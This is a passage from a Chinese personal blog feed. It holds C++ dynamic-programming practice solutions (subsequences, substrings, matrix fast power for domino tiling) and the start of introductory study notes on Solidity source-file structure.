class="line">1</span><br></pre></td><td class="code"><pre><span class="line">见样例</span><br></pre></td></tr></table></figure><p>先得到最长递减子序列长度，并算每一个元素的上一个的序号；然后找到d[i =ans的元素位置；再根据pre往前得到最长递减子序列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"><span class="type">int</span> pre[maxn]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line"><span class="built_in">memset</span>(pre, <span class="number">0</span>, <span class="built_in">sizeof</span>(pre));</span><br><span class="line"><span class="type">int</span> b[n] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt;a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">d[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; a[i])&#123;</span><br><span class="line"><span class="type">int</span> tmp = d[j]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp &gt; d[i])&#123;</span><br><span class="line">d[i] = tmp;</span><br><span class="line">pre[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(ans, d[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout &lt;&lt; ans &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//for(int i = 0; i &lt; n; i++)&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%d:%d\n&quot;, d[i], pre[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="type">int</span> t = n<span class="number">-1</span>, l;</span><br><span class="line"><span class="keyword">while</span>(t)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[t] == ans)&#123;</span><br><span class="line">l = t;</span><br><span class="line">&#125;</span><br><span class="line">t--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout &lt;&lt; l &lt;&lt; endl;</span></span><br><span class="line">t = ans<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(; l!=<span class="number">0</span>; l = pre[l])&#123;</span><br><span class="line">b[t--] = a[l];</span><br><span class="line">&#125;</span><br><span class="line">b[t] = a[l];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ans; i++)&#123;</span><br><span class="line">cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最长公共子序列">最长公共子序列</h2><p>状态转移方程：</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702223636395.png" alt="image-20230702223636395"></p><h3 id="coincidence">Coincidence</h3><h5 id="题目描述-46">题目描述</h5><p>Find a longest common subsequence of two strings.</p><h5 id="输入输出格式-44">输入输出格式</h5><h6 id="输入描述-46">输入描述:</h6><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">First <span class="keyword">and</span> <span class="keyword">second</span> <span class="built_in">line</span> <span class="keyword">of</span> <span class="keyword">each</span> input <span class="keyword">case</span> contain <span class="literal">two</span> strings <span class="keyword">of</span> lowercase <span class="keyword">character</span> <span class="keyword">a</span>…z. There are no spaces <span class="keyword">before</span>, inside <span class="keyword">or</span> <span class="keyword">after</span> <span class="keyword">the</span> strings. Lengths <span class="keyword">of</span> strings <span class="built_in">do</span> <span class="keyword">not</span> exceed <span class="number">100.</span></span><br></pre></td></tr></table></figure><h6 id="输出描述-46">输出描述:</h6><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For <span class="keyword">each</span> <span class="keyword">case</span>, output k – <span class="keyword">the</span> <span class="built_in">length</span> <span class="keyword">of</span> <span class="keyword">a</span> longest common subsequence <span class="keyword">in</span> <span class="literal">one</span> <span class="built_in">line</span>.</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> d[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line"><span class="type">int</span> la = a.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> lb = b.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=la; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= lb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>])&#123;</span><br><span class="line">d[i][j] = d[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">d[i][j] = <span class="built_in">max</span>(d[i<span class="number">-1</span>][j], d[i][j<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; d[la][lb] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长连续公共子序列">最长连续公共子序列</h3><h5 id="题目描述-47">题目描述</h5><p>Time Limit: 1000 ms Memory Limit: 256 mb</p><p>输入两个字符串s1,s2。输出最长连续公共子串长度和最长连续公共子串。</p><h5 id="输入输出格式-45">输入输出格式</h5><h6 id="输入描述-47">输入描述:</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多组数据输入。</span><br><span class="line">输入两个字符串<span class="built_in">s1</span>,<span class="built_in">s2</span>，长度不大于<span class="number">100</span>，以空格隔开。</span><br></pre></td></tr></table></figure><h6 id="输出描述-47">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出最长连续公共子串长度和最长连续公共子串。</span><br></pre></td></tr></table></figure><p>这种情况的状态转移方程为：</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702230322534.png" alt="image-20230702230322534"></p><p>然后每次得到最长公共子串获取其末尾的下标，再通过长度就可打印序列（注意要最后一个，所以有等号）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> d[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line"><span class="type">int</span> la = a.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> lb = b.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>, l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=la; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= lb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>])&#123;</span><br><span class="line">d[i][j] = d[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(d[i][j] &gt;= res)&#123;</span><br><span class="line">res = d[i][j];</span><br><span class="line">l = i;</span><br><span class="line">r = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">d[i][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = l - res; i &lt; l; i++)&#123;</span><br><span class="line">cout &lt;&lt;a[i];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="骑车路线">骑车路线</h3><h5 id="题目描述-48">题目描述</h5><p>Tomislav最近发现自己的身材完全走样了，她走楼梯都变得很累。一天早上她起来以后，她决定恢复姣好的身材。她最喜欢的运动是骑自行车，因此她决定在本地的小山上做一次旅行。</p><p>她骑自行车的路线可以描述为N个数字的数列，每个数字表示每一段路地海拔高度。Tomislav最感兴趣的是最长的高度一直上升的子序列，她称这一段路为爬坡，Tomislav只想考虑这段爬坡的高度差（即开始和最后的数字的差距），而不是什么路程长度。</p><p>一段爬坡路被定义为至少两个连续的上升数列。例如，我们考虑如下路线数列123 5 7 10 6 1 11，这里有两个爬坡，第一个爬坡（3 5 710）的高度差是7，第二个爬坡的高度差是10（1 11）。</p><p>帮助Tomislav计算高度差最大的爬坡的高度差。</p><h5 id="输入输出格式-46">输入输出格式</h5><h6 id="输入描述-48">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多组测试数据输入。</span><br><span class="line">第一行是一个正整数<span class="built_in">N</span> (<span class="number">1</span>&lt;= <span class="built_in">N</span> &lt;= <span class="number">1000</span>), 描述了路线数列。</span><br><span class="line">第二行有<span class="built_in">N</span>个正整数，每个正整数<span class="built_in">Pi</span> (<span class="number">1</span>&lt;= <span class="built_in">Pi</span> &lt;= <span class="number">1000</span>)表示相应路段的海拔高度。</span><br></pre></td></tr></table></figure><h6 id="输出描述-48">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所有爬坡中的最大高度差，如果路线数列里面没有爬坡，就输出0。</span><br></pre></td></tr></table></figure><p>我想的是用d[i]来定义到i为止最大的高度差，但过不了所有用例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;n; i++)&#123;</span><br><span class="line">d[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="comment">//cout &lt;&lt; d[j] &lt;&lt; &quot;vs&quot; &lt;&lt; a[i] - a[j] &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">if</span>(d[i] &lt; d[j] || d[i] &lt; (a[i] - a[j])) d[i] = <span class="built_in">max</span>(d[j], a[i] - a[j]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="built_in">max</span>(res, d[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//for(int i = 0; i &lt;n; i++)&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; d[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; endl;</span></span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="misc">misc</h1><h3 id="骨牌---加强版">骨牌 - 加强版</h3><h5 id="题目描述-49">题目描述</h5><p>有2<em>n 的地板，用1</em>2和 2*1的骨牌进行铺地板。问共有多少种情况。</p><p>结果对 999983 取余，<strong>1&lt;=n&lt;=1e12。</strong></p><h5 id="输入输出格式-47">输入输出格式</h5><h6 id="输入描述-49">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入一个整数<span class="built_in">n</span></span><br></pre></td></tr></table></figure><h6 id="输出描述-49">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出一个整数，表示有多少种情况</span><br></pre></td></tr></table></figure><p>其实就是斐波那契数列的矩阵快速幂</p><p><span class="math display">\[[f(n-1), f(n-2)]*\begin{bmatrix}1 &amp; 1\\1&amp;0 \end{bmatrix} =[f(n), f(n-1)]\\所以\begin{bmatrix}f(1) &amp; f(2)\\0&amp;0 \end{bmatrix} *(\begin{bmatrix}1 &amp; 0\\1&amp;1 \end{bmatrix})^n =\begin{bmatrix}f(n+2) &amp; f(n+1)\\0&amp;0 \end{bmatrix}\]</span></p><p>无优化的递归是2^n，记忆化处理是n，但由于数据量是1e12，递归过深会爆栈</p><p>改成递推是O(n)，也处理不了，变成矩阵乘法是O(8n)</p><p>再加上快速幂就是O(8logn)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> ll mod = <span class="number">999983</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">matrix</span>&#123;</span><br><span class="line">ll m[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function">matrix <span class="title">multi</span><span class="params">(<span class="keyword">struct</span> matrix a, <span class="keyword">struct</span> matrix b)</span></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">matrix</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)&#123;</span><br><span class="line">tmp.m[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2</span>; k++)&#123;</span><br><span class="line">tmp.m[i][j] = (tmp.m[i][j] + a.m[i][k] * b.m[k][j]) % mod;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fastpower</span><span class="params">(ll n)</span></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">matrix</span> base, ans;</span><br><span class="line">    base.m[<span class="number">0</span>][<span class="number">0</span>] = base.m[<span class="number">0</span>][<span class="number">1</span>] = base.m[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    base.m[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ans.m[<span class="number">0</span>][<span class="number">0</span>] = ans.m[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;  </span><br><span class="line">    ans.m[<span class="number">0</span>][<span class="number">1</span>] = ans.m[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n &amp; <span class="number">1</span>)&#123;</span><br><span class="line">            ans = <span class="built_in">multi</span>(ans, base);</span><br><span class="line">        &#125;</span><br><span class="line">        base = <span class="built_in">multi</span>(base, base);</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans.m[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ll n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>) cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>) cout &lt;&lt; <span class="number">2</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">fastpower</span>(n) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;我是什么fw😢&lt;/p&gt;</summary>
    
    
    
    
    <category term="algorithm" scheme="http://sh1k4ku.github.io/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>智能合约</title>
    <link href="http://sh1k4ku.github.io/2023/05/08/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    <id>http://sh1k4ku.github.io/2023/05/08/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</id>
    <published>2023-05-08T01:55:04.000Z</published>
    <updated>2023-05-22T14:22:35.379Z</updated>
    
    <content type="html"><![CDATA[<p>之前做审计的时候都是碰到什么学什么，这样的代价就是基础很差，要一直搜重复的东西，所以决定好好读一遍<a href="https://learnblockchain.cn/docs/solidity/">Solidity 中文文档 —Solidity中文文档 — 登链社区(learnblockchain.cn)</a>，然后再搞别的，预期这个月以内</p><span id="more"></span><p>[toc]</p><h1 id="solidity源文件结构">Solidity源文件结构</h1><p>源文件中可以包含任意数量的 合约定义 , 源文件引入 , pragma 、 usingfor 指令和 struct , enum , function , error 以及常量定义。</p><h2 id="spdx版本许可标识">SPDX版本许可标识</h2><p>全称为“The Softwaere Package Data Exchange"，用来说明其版权许可证</p><p><code>// SPDX-License-Identifier: MIT</code></p><h2 id="版本标识">版本标识</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pragma</span></span><br></pre></td></tr></table></figure><p>Pragma 是 pragmatic information的简称，启用编译检查功能，检查版本是否匹配，例如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pragma</span> solidity ^<span class="number">0</span>.<span class="number">5</span>.<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>表示可被大于等于0.5.2且小于0.6.0的版本编译。</p><h2 id="导入其他源文件">导入其他源文件</h2><p>solidity支持导入语句来模块化代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;filename&quot;</span></span><br></pre></td></tr></table></figure><p><code>filename</code>被称为导入路径</p><p>但不建议使用这种形式，它会把导入路径中的全局符号都导入到当前全局作用域，会无法预测的污染当前命名空间，可以使用如下形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import * as symbolName from “filename”;</span><br><span class="line">//两种方式等价</span><br><span class="line">import &quot;filename&quot; as symbolName;</span><br></pre></td></tr></table></figure><p>如果存在命名冲突，可以在导入时重命名符号。下面代码就创建了新的全局符号<code>alias</code>和<code>symbol2</code>，引用的<code>symbol1</code>和<code>symbol2</code>来自”filename“。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;symbol1 <span class="keyword">as</span> <span class="keyword">alias</span>, symbol2&#125; <span class="keyword">from</span> &quot;filename&quot;;</span><br></pre></td></tr></table></figure><h2 id="注释">注释</h2><p>可以使用单行注释（ <code>//</code> ）和多行注释（<code>/*...*/</code> ）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//这是一个单行注释</span><br><span class="line">/*</span><br><span class="line">这是一个</span><br><span class="line">多行注释。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>此外，还有一种注释叫做 NatSpec 注释，用三斜线（ <code>///</code>）或双星号块（ <code>/** ... */</code> ）来写，它们应该直接用在函数声明或语句的上方。</p><h1 id="合约结构">合约结构</h1><p>在 Solidity 中，合约类似于面向对象编程语言中的类。 每个合约中可以包含状态变量， 函数， 函数修饰器， 事件， 错误， 结构类型 和 枚举类型的声明，且合约可以从其他合约继承。</p><p>还有一些特殊种类的合同，叫做 库合约 和 接口合约。</p><h2 id="状态变量">状态变量</h2><p>状态变量是指其值被永久地存储在合约存储中的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData; // 状态变量</span><br><span class="line">    // ...</span><br><span 